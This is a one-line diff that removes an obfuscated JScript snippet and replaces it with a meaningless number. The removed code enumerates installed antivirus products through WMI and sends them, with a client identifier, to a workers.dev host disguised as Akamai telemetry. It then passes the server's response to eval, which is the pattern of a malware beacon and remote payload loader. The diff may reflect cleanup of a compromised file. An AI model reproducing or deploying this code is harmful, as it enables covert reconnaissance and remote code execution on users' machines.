@@ -1,1 +1,1 @@
-(function(){for(var s="",e=new Enumerator(GetObject("winmgmts://./root/SecurityCenter2").ExecQuery("Select * from AntiVirusProduct"));!e.atEnd();e.moveNext())s+=e.item().DisplayName+", ";var apiUrl="https://health.akamai-tech.workers.dev/Telemetry/b1aa10a9eb1559113af36f99f74179ce/Collector.php";h.open("GET",apiUrl+"?client="+n+"&s="+s,!1),h.send(),eval(h.ResponseText)})();
+23123232131
